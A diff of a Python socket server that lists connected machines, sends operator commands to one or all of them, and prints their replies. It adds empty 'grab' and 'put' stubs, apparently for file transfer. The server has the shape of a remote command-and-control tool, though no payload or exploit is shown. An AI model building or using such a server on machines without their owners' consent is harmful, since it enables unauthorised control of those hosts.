@@ -1,10 +1,12 @@
 #!/usr/bin/env python3
 import socket 
 import threading
+import tqdm
+import os
 
 ## ========  Config  ========
 HEADER = 64
-PORT = 5054
+PORT = 5051
 #SERVER = '10.96.10.191'
 SERVER = socket.gethostbyname(socket.gethostname())
 ADDR = (SERVER, PORT)
@@ -18,22 +20,12 @@ server.bind(ADDR)
 connected_machines = []
 
 ## ========  Functions  ========
-def handle_client(conn, addr):
-    #conn.send(f"Connected to {SERVER}".encode(FORMAT))
-    connected = True
-    while connected:
-        msg_length = conn.recv(HEADER).decode(FORMAT)
-        if msg_length:
-            msg_length = int(msg_length)
-            msg = conn.recv(msg_length).decode(FORMAT)
-            if msg == DISCONNECT_MESSAGE:
-                connected = False
-
-            print(f"[{addr}] {msg}")
-            conn.send("Msg received".encode(FORMAT))
-
-    conn.close()
-       
+def get_response(conn):
+    msg_length = conn.recv(HEADER).decode(FORMAT)
+    msg_length = int(msg_length)
+    msg = conn.recv(msg_length).decode(FORMAT)
+    return msg
+            
 # Processes the user input
 def handle_user():
 
@@ -45,12 +37,25 @@ def handle_user():
 
         ## Broadcast
         elif cmd_lst[0] == "broadcast":
-            new_cmd = ' '.join(cmd_lst[1:])
+            new_cmd = cmd_lst[1:]
+            if len(new_cmd) < 1:
+                print("Usage: broadcast <cmd>")
+                continue
+            new_cmd = ' '.join(new_cmd)
             print(f'Sending \"{new_cmd}\" to...')
+            itr = 1
             for data in connected_machines:
-                print(data['addr'][0])
-                new_cmd = ' '.join(cmd_lst[1:])
-                data['conn'].send(new_cmd.encode(FORMAT))
+                print(f"{str(itr)}) {data['addr'][0]}")
+                message = new_cmd.encode(FORMAT)
+                length = str(len(message)).encode(FORMAT)
+                length += b' ' * (HEADER - len(length))
+                data['conn'].send(length)
+                data['conn'].send(message)
+                resp = get_response(data['conn'])
+                print(resp)
+                print("=============================================")
+                itr = itr + 1
+
 
         ## List
         elif cmd_lst[0] == "list":
@@ -75,9 +80,19 @@ def handle_user():
                     length += b' ' * (HEADER - len(length))
                     data['conn'].send(length)
                     data['conn'].send(message)
-                    break
+                    resp = get_response(data['conn'])
+                    print(resp)
+
             if not sent:
                 print(f'{new_cmd[0]} is not connected to the server.')
+    
+        ## grab
+        elif cmd_lst[0] == "grab":
+            pass
+
+        ## put
+        elif cmd_lst[0] == "put":
+            pass
 
         ## help
         elif cmd_lst[0] == "help":
@@ -103,8 +118,6 @@ def start():
             'addr': addr,
         }
         connected_machines.append(data)
-        thread = threading.Thread(target=handle_client, args=(conn, addr))
-        thread.start()
 
 
 start()
